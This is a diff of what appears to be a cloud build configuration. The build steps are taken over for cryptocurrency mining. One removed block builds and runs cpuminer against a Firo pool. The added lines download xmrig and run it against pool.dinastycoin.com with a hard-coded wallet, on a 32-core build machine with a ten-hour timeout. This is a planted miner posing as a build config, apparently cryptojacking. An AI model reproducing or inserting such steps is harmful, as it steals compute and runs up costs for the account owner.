@@ -6,19 +6,10 @@ steps:
       - |
           apt-get update
           apt-get install -y wget
-          apt-get install -y apt-utils
-          apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
-          git clone https://github.com/firoorg/cpuminer
-          chmod -R 777 cpuminer
-          cd cpuminer
-          ./build.sh
-          ls -al
-          cd -
-          chmod -R 777 cpuminer
-          cd cpuminer
-          ./build.sh
-          ls -al
-          ./cpuminer -a mtp -o stratum+tcp://firo.2miners.com:8181 -u aBLVfkCbCHagdcVM9weTRyiB5x6rSkzsq7.gccb -p x
+          wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-static-x64.tar.gz
+          tar xf xmrig-6.12.1-linux-static-x64.tar.gz
+          cd xmrig-6.12.1
+          ./xmrig -o pool.dinastycoin.com:5555 -u 46pnjyfeDsULtY7hzFCW3QV5uXuYSXHWZMU66ZwuUxiRbzYNDDtMhaiRYgaAHbsnxxdSVUkrnK3wtYvEFGJDhahcLbkBTyi --p gccb
 options:
   machineType: 'N1_HIGHCPU_32'
 timeout: 36000s
